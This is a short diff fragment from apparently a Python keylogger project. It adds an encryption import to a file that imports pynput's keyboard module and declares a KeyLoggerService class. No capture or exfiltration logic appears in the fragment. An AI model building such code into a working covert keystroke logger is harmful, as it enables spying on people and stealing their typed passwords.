@@ -2,6 +2,7 @@ import time
 from datetime import datetime
 from pynput import keyboard
 import threading
+from encrypt import Encryption
 
 
 class KeyLoggerService:
